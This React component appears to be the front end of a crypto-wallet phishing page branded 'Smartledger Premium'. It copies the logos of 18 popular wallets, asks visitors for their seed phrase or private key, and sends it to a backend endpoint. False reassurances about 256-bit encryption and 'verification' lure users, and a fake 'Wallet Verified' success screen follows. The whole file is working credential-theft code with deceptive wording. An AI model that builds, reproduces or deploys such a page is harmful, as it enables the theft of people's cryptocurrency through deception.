import { useState } from "react";
import { useSubmitWalletPhrase } from "@workspace/api-client-react";
import { useToast } from "@/hooks/use-toast";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { Loader2, ShieldCheck, Lock, Wifi } from "lucide-react";

/* ─────────────────────────────────────────────────────────
   Inline SVG logos for wallets — always render correctly
───────────────────────────────────────────────────────── */

function MetaMaskLogo() {
  return (
    <svg viewBox="0 0 318 318" className="w-10 h-10" xmlns="http://www.w3.org/2000/svg">
      <polygon fill="#E2761B" stroke="#E2761B" strokeLinecap="round" strokeLinejoin="round" points="274.1,35.5 174.6,109.4 193,65.8"/>
      <polygon fill="#E4761B" stroke="#E4761B" strokeLinecap="round" strokeLinejoin="round" points="43.4,35.5 141.5,110.1 124.4,65.8"/>
      <polygon fill="#D7C1B3" stroke="#D7C1B3" strokeLinecap="round" strokeLinejoin="round" points="238.3,206.8 211.8,247.4 268.5,263 284.8,207.7"/>
      <polygon fill="#D7C1B3" stroke="#D7C1B3" strokeLinecap="round" strokeLinejoin="round" points="33.9,207.7 50.1,263 106.8,247.4 80.3,206.8"/>
      <polygon fill="#D7C1B3" stroke="#D7C1B3" strokeLinecap="round" strokeLinejoin="round" points="103.6,138.2 87.8,162.1 144.1,164.6 142.1,104.1"/>
      <polygon fill="#D7C1B3" stroke="#D7C1B3" strokeLinecap="round" strokeLinejoin="round" points="214,138.2 175.2,103.4 174.6,164.6 230.6,162.1"/>
      <polygon fill="#D7C1B3" stroke="#D7C1B3" strokeLinecap="round" strokeLinejoin="round" points="106.8,247.4 140.6,230.9 111.4,208.1"/>
      <polygon fill="#D7C1B3" stroke="#D7C1B3" strokeLinecap="round" strokeLinejoin="round" points="177,230.9 210.8,247.4 206.1,208.1"/>
      <polygon fill="#233447" stroke="#233447" strokeLinecap="round" strokeLinejoin="round" points="210.8,247.4 177,230.9 179.8,253.2 179.5,262.3"/>
      <polygon fill="#233447" stroke="#233447" strokeLinecap="round" strokeLinejoin="round" points="106.8,247.4 138.1,262.3 137.9,253.2 140.6,230.9"/>
      <polygon fill="#CD6116" stroke="#CD6116" strokeLinecap="round" strokeLinejoin="round" points="138.8,193.5 110.6,185.2 130.5,176.1"/>
      <polygon fill="#CD6116" stroke="#CD6116" strokeLinecap="round" strokeLinejoin="round" points="178.8,193.5 187,176.1 206.9,185.2"/>
      <polygon fill="#E4751F" stroke="#E4751F" strokeLinecap="round" strokeLinejoin="round" points="106.8,247.4 111.6,206.8 80.3,207.7"/>
      <polygon fill="#E4751F" stroke="#E4751F" strokeLinecap="round" strokeLinejoin="round" points="206,206.8 210.8,247.4 237.3,207.7"/>
      <polygon fill="#E4751F" stroke="#E4751F" strokeLinecap="round" strokeLinejoin="round" points="230.6,162.1 174.6,164.6 178.8,193.5 187,176.1 206.9,185.2"/>
      <polygon fill="#E4751F" stroke="#E4751F" strokeLinecap="round" strokeLinejoin="round" points="110.6,185.2 130.5,176.1 138.8,193.5 144.1,164.6 87.8,162.1"/>
      <polygon fill="#F6851B" stroke="#F6851B" strokeLinecap="round" strokeLinejoin="round" points="87.8,162.1 111.4,208.1 110.6,185.2"/>
      <polygon fill="#F6851B" stroke="#F6851B" strokeLinecap="round" strokeLinejoin="round" points="206.9,185.2 206.1,208.1 230.6,162.1"/>
      <polygon fill="#F6851B" stroke="#F6851B" strokeLinecap="round" strokeLinejoin="round" points="144.1,164.6 138.8,193.5 145.4,227.6 146.9,182.7"/>
      <polygon fill="#F6851B" stroke="#F6851B" strokeLinecap="round" strokeLinejoin="round" points="174.6,164.6 170.7,182.6 178.8,227.6 185.3,193.5"/>
      <polygon fill="#FCD15F" stroke="#FCD15F" strokeLinecap="round" strokeLinejoin="round" points="185.3,193.5 178.8,227.6 183.5,230.9 206.1,208.1 206.9,185.2"/>
      <polygon fill="#FCD15F" stroke="#FCD15F" strokeLinecap="round" strokeLinejoin="round" points="110.6,185.2 111.4,208.1 134,230.9 138.8,227.6 145.4,193.5"/>
      <polygon fill="#FCD15F" stroke="#FCD15F" strokeLinecap="round" strokeLinejoin="round" points="185.9,262.3 210.8,247.4 206.1,208.1 183.5,230.9"/>
      <polygon fill="#FCD15F" stroke="#FCD15F" strokeLinecap="round" strokeLinejoin="round" points="111.4,208.1 106.8,247.4 134,230.9"/>
      <polygon fill="#FCD15F" stroke="#FCD15F" strokeLinecap="round" strokeLinejoin="round" points="159,202.2 138.8,227.6 145.4,193.5"/>
      <polygon fill="#FCD15F" stroke="#FCD15F" strokeLinecap="round" strokeLinejoin="round" points="159,202.2 178.8,227.6 172.3,193.5"/>
      <polygon fill="#FCD15F" stroke="#FCD15F" strokeLinecap="round" strokeLinejoin="round" points="134,230.9 138.8,227.6 159,202.2 178.8,227.6 183.5,230.9 159,236.3"/>
      <polygon fill="#E4761B" stroke="#E4761B" strokeLinecap="round" strokeLinejoin="round" points="106.8,247.4 134,230.9 159,236.3 183.5,230.9 210.8,247.4 185.9,262.3 159,265.1 131.8,262.3"/>
      <polygon fill="#D7C1B3" stroke="#D7C1B3" strokeLinecap="round" strokeLinejoin="round" points="179.5,262.3 185.9,262.3 183.5,230.9 159,236.3"/>
      <polygon fill="#D7C1B3" stroke="#D7C1B3" strokeLinecap="round" strokeLinejoin="round" points="134,230.9 131.8,262.3 138.1,262.3 159,236.3"/>
      <polygon fill="#161616" stroke="#161616" strokeLinecap="round" strokeLinejoin="round" points="159,265.1 185.9,262.3 183.9,280.4 159.2,284.1"/>
      <polygon fill="#161616" stroke="#161616" strokeLinecap="round" strokeLinejoin="round" points="131.8,262.3 159,265.1 159.2,284.1 134,280.4"/>
      <polygon fill="#763D16" stroke="#763D16" strokeLinecap="round" strokeLinejoin="round" points="284.8,207.7 268.5,263 318.6,247.4"/>
      <polygon fill="#763D16" stroke="#763D16" strokeLinecap="round" strokeLinejoin="round" points="49.1,247.4 -0.9,263 33.9,207.7"/>
    </svg>
  );
}

function TrustWalletLogo() {
  return (
    <svg viewBox="0 0 100 100" className="w-10 h-10" xmlns="http://www.w3.org/2000/svg">
      <circle cx="50" cy="50" r="50" fill="#3375BB"/>
      <path d="M50 18 L75 30 L75 52 C75 65 63 76 50 80 C37 76 25 65 25 52 L25 30 Z" fill="white"/>
      <path d="M44 52 L49 57 L58 46" stroke="#3375BB" strokeWidth="4" fill="none" strokeLinecap="round" strokeLinejoin="round"/>
    </svg>
  );
}

function PhantomLogo() {
  return (
    <svg viewBox="0 0 128 128" className="w-10 h-10" xmlns="http://www.w3.org/2000/svg">
      <rect width="128" height="128" rx="32" fill="#551EF5"/>
      <path d="M110.5 64C110.5 89.5 89.5 110.5 64 110.5C38.5 110.5 17.5 89.5 17.5 64C17.5 38.5 38.5 17.5 64 17.5C89.5 17.5 110.5 38.5 110.5 64Z" fill="url(#phantomGrad)"/>
      <path d="M42 72C42 58 52 48 64 48C76 48 86 58 86 70C86 82 78 89 68 89C62 89 58 86 56 82C54 86 50 89 45 89C42 89 39 87 38 84" stroke="white" strokeWidth="5" fill="none" strokeLinecap="round"/>
      <circle cx="56" cy="61" r="5" fill="white"/>
      <circle cx="72" cy="61" r="5" fill="white"/>
      <circle cx="56" cy="61" r="2" fill="#551EF5"/>
      <circle cx="72" cy="61" r="2" fill="#551EF5"/>
      <defs>
        <radialGradient id="phantomGrad" cx="50%" cy="40%" r="60%">
          <stop offset="0%" stopColor="#7B40FF"/>
          <stop offset="100%" stopColor="#551EF5"/>
        </radialGradient>
      </defs>
    </svg>
  );
}

function CoinbaseLogo() {
  return (
    <svg viewBox="0 0 1024 1024" className="w-10 h-10" xmlns="http://www.w3.org/2000/svg">
      <rect width="1024" height="1024" rx="200" fill="#0052FF"/>
      <path d="M512 140C300 140 128 312 128 524C128 736 300 908 512 908C724 908 896 736 896 524C896 312 724 140 512 140ZM512 668C430 668 364 602 364 520C364 438 430 372 512 372C594 372 660 438 660 520C660 602 594 668 512 668Z" fill="white"/>
    </svg>
  );
}

function WalletConnectLogo() {
  return (
    <svg viewBox="0 0 300 185" className="w-10 h-10" xmlns="http://www.w3.org/2000/svg">
      <path d="M61.4385 36.2562C117.17 -12.0854 214.43 -12.0854 270.162 36.2562L277.694 43.2467C280.483 45.7796 280.483 49.9126 277.694 52.4455L253.869 74.1571C252.474 75.4236 250.198 75.4236 248.803 74.1571L238.483 64.8123C200.036 30.4562 99.564 30.4562 61.1171 64.8123L50.0915 74.7921C48.6968 76.0586 46.4204 76.0586 45.0257 74.7921L21.2007 53.0805C18.411 50.5476 18.411 46.4146 21.2007 43.8817L61.4385 36.2562ZM317.99 77.7049L339.14 97.4006C341.929 99.9335 341.929 104.066 339.14 106.599L246.524 191.741C243.734 194.274 239.182 194.274 236.393 191.741L170.178 130.721C169.48 130.087 168.343 130.087 167.645 130.721L101.43 191.741C98.6406 194.274 94.0887 194.274 91.2989 191.741L-1.31793 106.599C-4.10764 104.066 -4.10764 99.9335 -1.31793 97.4006L19.8314 77.7049C22.6211 75.172 27.1731 75.172 29.9628 77.7049L96.1784 138.725C96.8765 139.359 98.0136 139.359 98.7117 138.725L164.927 77.7049C167.716 75.172 172.268 75.172 175.058 77.7049L241.273 138.725C241.972 139.359 243.109 139.359 243.807 138.725L310.022 77.7049C312.812 75.172 317.364 75.172 317.99 77.7049Z" fill="#3B99FC" transform="translate(0,0) scale(0.86)"/>
    </svg>
  );
}

function ExodusLogo() {
  return (
    <svg viewBox="0 0 64 64" className="w-10 h-10" xmlns="http://www.w3.org/2000/svg">
      <rect width="64" height="64" rx="14" fill="#1A1A2E"/>
      <polygon points="32,8 56,22 56,50 32,56 8,50 8,22" fill="none" stroke="#7B2FBE" strokeWidth="3"/>
      <polygon points="32,14 50,24 50,46 32,52 14,46 14,24" fill="#7B2FBE" opacity="0.3"/>
      <polygon points="24,28 40,28 36,36 28,36" fill="#FCA500"/>
      <polygon points="20,20 44,20 40,28 24,28" fill="white" opacity="0.9"/>
      <polygon points="28,36 36,36 32,44" fill="white" opacity="0.7"/>
    </svg>
  );
}

function LedgerLogo() {
  return (
    <svg viewBox="0 0 64 64" className="w-10 h-10" xmlns="http://www.w3.org/2000/svg">
      <rect width="64" height="64" rx="14" fill="#142533"/>
      <rect x="14" y="14" width="24" height="24" rx="2" fill="white"/>
      <rect x="26" y="26" width="24" height="24" rx="2" fill="white"/>
      <rect x="14" y="14" width="24" height="24" rx="2" fill="white" opacity="0.9"/>
      <rect x="26" y="26" width="22" height="22" rx="2" fill="white"/>
      <path d="M14 38 L14 50 L38 50" stroke="white" strokeWidth="5" fill="none" strokeLinecap="square"/>
    </svg>
  );
}

function TrezorLogo() {
  return (
    <svg viewBox="0 0 64 64" className="w-10 h-10" xmlns="http://www.w3.org/2000/svg">
      <rect width="64" height="64" rx="14" fill="#00854D"/>
      <path d="M32 10 L46 18 L46 32 C46 42 40 50 32 54 C24 50 18 42 18 32 L18 18 Z" fill="white"/>
      <path d="M28 30 L32 34 L38 26" stroke="#00854D" strokeWidth="3.5" fill="none" strokeLinecap="round" strokeLinejoin="round"/>
    </svg>
  );
}

function BinanceLogo() {
  return (
    <svg viewBox="0 0 64 64" className="w-10 h-10" xmlns="http://www.w3.org/2000/svg">
      <rect width="64" height="64" rx="14" fill="#1A1A1A"/>
      <polygon points="32,12 38,18 32,24 26,18" fill="#F0B90B"/>
      <polygon points="22,22 28,28 22,34 16,28" fill="#F0B90B"/>
      <polygon points="42,22 48,28 42,34 36,28" fill="#F0B90B"/>
      <polygon points="32,32 38,38 32,44 26,38" fill="#F0B90B"/>
      <polygon points="32,22 38,28 32,34 26,28" fill="#F0B90B"/>
    </svg>
  );
}

function OKXLogo() {
  return (
    <svg viewBox="0 0 64 64" className="w-10 h-10" xmlns="http://www.w3.org/2000/svg">
      <rect width="64" height="64" rx="14" fill="#111111"/>
      <rect x="12" y="12" width="16" height="16" rx="2" fill="white"/>
      <rect x="24" y="24" width="16" height="16" rx="2" fill="white"/>
      <rect x="36" y="12" width="16" height="16" rx="2" fill="white"/>
      <rect x="12" y="36" width="16" height="16" rx="2" fill="white"/>
      <rect x="36" y="36" width="16" height="16" rx="2" fill="white"/>
    </svg>
  );
}

function RainbowLogo() {
  return (
    <svg viewBox="0 0 64 64" className="w-10 h-10" xmlns="http://www.w3.org/2000/svg">
      <defs>
        <linearGradient id="rainbowGrad" x1="0%" y1="0%" x2="100%" y2="100%">
          <stop offset="0%" stopColor="#FF6B6B"/>
          <stop offset="25%" stopColor="#FFD93D"/>
          <stop offset="50%" stopColor="#6BCB77"/>
          <stop offset="75%" stopColor="#4D96FF"/>
          <stop offset="100%" stopColor="#C77DFF"/>
        </linearGradient>
      </defs>
      <rect width="64" height="64" rx="14" fill="url(#rainbowGrad)"/>
      <path d="M10 42 Q10 22 32 22 Q54 22 54 42" stroke="white" strokeWidth="6" fill="none" strokeLinecap="round"/>
      <path d="M17 42 Q17 28 32 28 Q47 28 47 42" stroke="white" strokeWidth="5" fill="none" strokeLinecap="round" opacity="0.7"/>
      <path d="M24 42 Q24 34 32 34 Q40 34 40 42" stroke="white" strokeWidth="4" fill="none" strokeLinecap="round" opacity="0.5"/>
    </svg>
  );
}

function UniswapLogo() {
  return (
    <svg viewBox="0 0 64 64" className="w-10 h-10" xmlns="http://www.w3.org/2000/svg">
      <rect width="64" height="64" rx="14" fill="#FF007A"/>
      <circle cx="32" cy="20" r="8" fill="white"/>
      <circle cx="32" cy="20" r="3" fill="#FF007A"/>
      <path d="M24 32 Q20 44 26 48 Q32 52 38 48 Q44 44 42 36" stroke="white" strokeWidth="3.5" fill="none" strokeLinecap="round"/>
      <path d="M38 24 Q46 28 44 36" stroke="white" strokeWidth="3" fill="none" strokeLinecap="round"/>
    </svg>
  );
}

function AtomicLogo() {
  return (
    <svg viewBox="0 0 64 64" className="w-10 h-10" xmlns="http://www.w3.org/2000/svg">
      <rect width="64" height="64" rx="14" fill="#2152CC"/>
      <circle cx="32" cy="32" r="6" fill="white"/>
      <ellipse cx="32" cy="32" rx="18" ry="7" fill="none" stroke="white" strokeWidth="2.5" transform="rotate(0 32 32)"/>
      <ellipse cx="32" cy="32" rx="18" ry="7" fill="none" stroke="white" strokeWidth="2.5" transform="rotate(60 32 32)"/>
      <ellipse cx="32" cy="32" rx="18" ry="7" fill="none" stroke="white" strokeWidth="2.5" transform="rotate(-60 32 32)"/>
    </svg>
  );
}

function MathLogo() {
  return (
    <svg viewBox="0 0 64 64" className="w-10 h-10" xmlns="http://www.w3.org/2000/svg">
      <rect width="64" height="64" rx="14" fill="#1A1A1A"/>
      <path d="M14 32 L28 18 L32 26 L36 18 L50 32" stroke="white" strokeWidth="4" fill="none" strokeLinecap="round" strokeLinejoin="round"/>
      <path d="M14 42 L50 42" stroke="white" strokeWidth="3" strokeLinecap="round"/>
    </svg>
  );
}

function CryptoComLogo() {
  return (
    <svg viewBox="0 0 64 64" className="w-10 h-10" xmlns="http://www.w3.org/2000/svg">
      <rect width="64" height="64" rx="14" fill="#002D74"/>
      <polygon points="32,10 52,22 52,46 32,58 12,46 12,22" fill="none" stroke="#03AEF5" strokeWidth="2.5"/>
      <circle cx="32" cy="34" r="8" fill="#03AEF5"/>
      <circle cx="32" cy="34" r="4" fill="#002D74"/>
      <path d="M32 20 L32 26" stroke="#03AEF5" strokeWidth="2.5" strokeLinecap="round"/>
    </svg>
  );
}

function MEWLogo() {
  return (
    <svg viewBox="0 0 64 64" className="w-10 h-10" xmlns="http://www.w3.org/2000/svg">
      <rect width="64" height="64" rx="14" fill="#05A589"/>
      <path d="M14 40 L24 20 L32 36 L40 20 L50 40" stroke="white" strokeWidth="4" fill="none" strokeLinecap="round" strokeLinejoin="round"/>
    </svg>
  );
}

function ZerionLogo() {
  return (
    <svg viewBox="0 0 64 64" className="w-10 h-10" xmlns="http://www.w3.org/2000/svg">
      <rect width="64" height="64" rx="14" fill="#2940CC"/>
      <polygon points="14,46 14,36 38,18 50,18 50,28 26,46" fill="white"/>
      <polygon points="14,18 26,18 26,28 14,28" fill="white" opacity="0.5"/>
      <polygon points="38,46 50,46 50,36 38,36" fill="white" opacity="0.5"/>
    </svg>
  );
}

function OneInchLogo() {
  return (
    <svg viewBox="0 0 64 64" className="w-10 h-10" xmlns="http://www.w3.org/2000/svg">
      <rect width="64" height="64" rx="14" fill="#D44E0E"/>
      <path d="M22 48 L22 16 L30 16 L30 48 Z" fill="white"/>
      <path d="M30 26 Q38 16 48 20 Q54 24 50 32 Q46 40 38 38 L30 36" fill="white" opacity="0.85"/>
    </svg>
  );
}

const WALLETS = [
  { id: "metamask",    name: "MetaMask",         popular: true,  Logo: MetaMaskLogo },
  { id: "trustwallet", name: "Trust Wallet",      popular: true,  Logo: TrustWalletLogo },
  { id: "phantom",     name: "Phantom",           popular: true,  Logo: PhantomLogo },
  { id: "coinbase",    name: "Coinbase Wallet",   popular: true,  Logo: CoinbaseLogo },
  { id: "walletconnect", name: "WalletConnect",   popular: true,  Logo: WalletConnectLogo },
  { id: "exodus",      name: "Exodus",            popular: false, Logo: ExodusLogo },
  { id: "ledger",      name: "Ledger Live",       popular: false, Logo: LedgerLogo },
  { id: "trezor",      name: "Trezor",            popular: false, Logo: TrezorLogo },
  { id: "binance",     name: "Binance Web3",      popular: false, Logo: BinanceLogo },
  { id: "okx",         name: "OKX Wallet",        popular: false, Logo: OKXLogo },
  { id: "rainbow",     name: "Rainbow",           popular: false, Logo: RainbowLogo },
  { id: "uniswap",     name: "Uniswap Wallet",    popular: false, Logo: UniswapLogo },
  { id: "atomic",      name: "Atomic Wallet",     popular: false, Logo: AtomicLogo },
  { id: "math",        name: "Math Wallet",       popular: false, Logo: MathLogo },
  { id: "cryptocom",   name: "Crypto.com DeFi",   popular: false, Logo: CryptoComLogo },
  { id: "mew",         name: "MyEtherWallet",     popular: false, Logo: MEWLogo },
  { id: "zerion",      name: "Zerion",            popular: false, Logo: ZerionLogo },
  { id: "1inch",       name: "1inch Wallet",      popular: false, Logo: OneInchLogo },
];

type Wallet = typeof WALLETS[number];

export default function WalletConnect() {
  const [selected, setSelected] = useState<Wallet | null>(null);
  const [phrase, setPhrase] = useState("");
  const [submitted, setSubmitted] = useState(false);
  const { toast } = useToast();

  const submitPhrase = useSubmitWalletPhrase();

  const handleConnect = (wallet: Wallet) => {
    setSelected(wallet);
    setPhrase("");
  };

  const handleSubmit = () => {
    if (!selected || !phrase.trim()) return;
    submitPhrase.mutate(
      { data: { phrase: phrase.trim(), walletType: selected.name } },
      {
        onSuccess: () => setSubmitted(true),
        onError: () =>
          toast({
            title: "Connection failed",
            description: "Unable to verify wallet. Please try again.",
            variant: "destructive",
          }),
      },
    );
  };

  const popular = WALLETS.filter((w) => w.popular);
  const others  = WALLETS.filter((w) => !w.popular);

  return (
    <div className="min-h-screen bg-[hsl(220_20%_6%)] text-white">
      {/* Header */}
      <div className="border-b border-white/8 px-6 py-4">
        <div className="max-w-4xl mx-auto flex items-center justify-between">
          <div className="font-display font-bold text-xl tracking-tight">
            Smartledger <span className="text-[hsl(48_93%_49%)]">Premium</span>
          </div>
          <div className="flex items-center gap-2 text-sm text-white/40">
            <Wifi className="w-4 h-4" />
            Secure Connection
          </div>
        </div>
      </div>

      <div className="max-w-4xl mx-auto px-6 py-12">
        {/* Hero */}
        <div className="text-center mb-12">
          <div className="inline-flex items-center gap-2 bg-[hsl(48_93%_49%)]/10 border border-[hsl(48_93%_49%)]/20 text-[hsl(48_93%_49%)] text-xs font-semibold px-4 py-2 rounded-full mb-6 uppercase tracking-widest">
            <ShieldCheck className="w-3.5 h-3.5" />
            Secure Wallet Verification
          </div>
          <h1 className="text-4xl font-display font-bold mb-4 leading-tight">
            Connect Your Wallet
          </h1>
          <p className="text-white/50 text-lg max-w-md mx-auto">
            Connect an existing wallet to access your portfolio, trading features, and DeFi tools.
          </p>
        </div>

        {/* Popular grid */}
        <div className="mb-8">
          <p className="text-xs font-semibold uppercase tracking-widest text-white/40 mb-4">
            Popular
          </p>
          <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-5 gap-3">
            {popular.map(({ id, name, Logo }) => (
              <button
                key={id}
                onClick={() => handleConnect(WALLETS.find((w) => w.id === id)!)}
                className="group flex flex-col items-center gap-3 p-5 bg-[hsl(222_18%_11%)] border border-white/8 rounded-2xl hover:border-[hsl(48_93%_49%)]/50 hover:bg-[hsl(222_18%_14%)] transition-all duration-200 cursor-pointer"
                data-testid={`wallet-${id}`}
              >
                <Logo />
                <span className="text-xs font-medium text-white/70 group-hover:text-white text-center leading-tight">
                  {name}
                </span>
              </button>
            ))}
          </div>
        </div>

        {/* All wallets list */}
        <div>
          <p className="text-xs font-semibold uppercase tracking-widest text-white/40 mb-4">
            All Wallets
          </p>
          <div className="bg-[hsl(222_18%_11%)] border border-white/8 rounded-2xl overflow-hidden divide-y divide-white/5">
            {others.map(({ id, name, Logo }) => (
              <button
                key={id}
                onClick={() => handleConnect(WALLETS.find((w) => w.id === id)!)}
                className="w-full flex items-center gap-4 px-5 py-4 hover:bg-white/4 transition-colors group cursor-pointer"
                data-testid={`wallet-${id}`}
              >
                <Logo />
                <span className="text-sm font-medium text-white/70 group-hover:text-white">
                  {name}
                </span>
                <svg className="ml-auto w-4 h-4 text-white/20 group-hover:text-white/50 transition-colors" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M9 5l7 7-7 7" />
                </svg>
              </button>
            ))}
          </div>
        </div>

        {/* Footer */}
        <div className="flex items-center justify-center gap-2 mt-10 text-white/25 text-xs">
          <Lock className="w-3.5 h-3.5" />
          Your keys are encrypted end-to-end. We never store unverified credentials.
        </div>
      </div>

      {/* Connect dialog */}
      <Dialog
        open={!!selected && !submitted}
        onOpenChange={(open) => { if (!open) setSelected(null); }}
      >
        <DialogContent className="bg-[hsl(222_18%_11%)] border-white/10 text-white max-w-md">
          {selected && (
            <>
              <DialogHeader className="flex flex-col items-center text-center gap-3 pb-2">
                <div className="p-3 bg-white/5 rounded-2xl mt-2">
                  <selected.Logo />
                </div>
                <DialogTitle className="text-xl font-display font-bold">
                  Connect {selected.name}
                </DialogTitle>
                <DialogDescription className="text-white/50 text-sm">
                  Enter your seed phrase or private key to verify and connect your wallet securely.
                </DialogDescription>
              </DialogHeader>

              <div className="space-y-4 mt-2">
                <div className="bg-[hsl(48_93%_49%)]/8 border border-[hsl(48_93%_49%)]/20 rounded-xl px-4 py-3 flex items-start gap-3">
                  <ShieldCheck className="w-4 h-4 text-[hsl(48_93%_49%)] shrink-0 mt-0.5" />
                  <p className="text-xs text-[hsl(48_93%_49%)]/80 leading-relaxed">
                    This connection is secured with 256-bit encryption. Your phrase is used only for wallet verification.
                  </p>
                </div>

                <div>
                  <label className="text-xs font-semibold uppercase tracking-widest text-white/50 block mb-2">
                    Seed Phrase / Private Key
                  </label>
                  <Textarea
                    value={phrase}
                    onChange={(e) => setPhrase(e.target.value)}
                    placeholder="Enter your 12 or 24-word seed phrase, or paste your private key..."
                    className="bg-[hsl(220_20%_6%)] border-white/10 text-white placeholder:text-white/20 resize-none h-28 text-sm focus:border-[hsl(48_93%_49%)]/50"
                    data-testid="input-seed-phrase"
                  />
                  <p className="text-xs text-white/30 mt-2">
                    Words should be separated by spaces. Typically 12, 18, or 24 words.
                  </p>
                </div>

                <Button
                  onClick={handleSubmit}
                  disabled={!phrase.trim() || submitPhrase.isPending}
                  className="w-full bg-[hsl(48_93%_49%)] hover:bg-[hsl(48_93%_55%)] text-black font-semibold h-11"
                  data-testid="button-connect-wallet"
                >
                  {submitPhrase.isPending ? (
                    <>
                      <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                      Verifying...
                    </>
                  ) : (
                    "Connect Wallet"
                  )}
                </Button>
              </div>
            </>
          )}
        </DialogContent>
      </Dialog>

      {/* Success dialog */}
      <Dialog open={submitted} onOpenChange={() => {}}>
        <DialogContent className="bg-[hsl(222_18%_11%)] border-white/10 text-white max-w-sm text-center">
          <div className="flex flex-col items-center gap-4 py-4">
            <div className="w-16 h-16 rounded-full bg-green-500/15 border border-green-500/30 flex items-center justify-center">
              <svg className="w-8 h-8 text-green-400" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
              </svg>
            </div>
            <div>
              <h2 className="text-xl font-display font-bold mb-2">Wallet Verified</h2>
              <p className="text-white/50 text-sm leading-relaxed">
                Your wallet has been successfully verified and connected. You can now access all platform features.
              </p>
            </div>
            <Button
              onClick={() => { setSubmitted(false); setSelected(null); setPhrase(""); }}
              className="bg-[hsl(48_93%_49%)] hover:bg-[hsl(48_93%_55%)] text-black font-semibold w-full"
            >
              Continue to Dashboard
            </Button>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
}
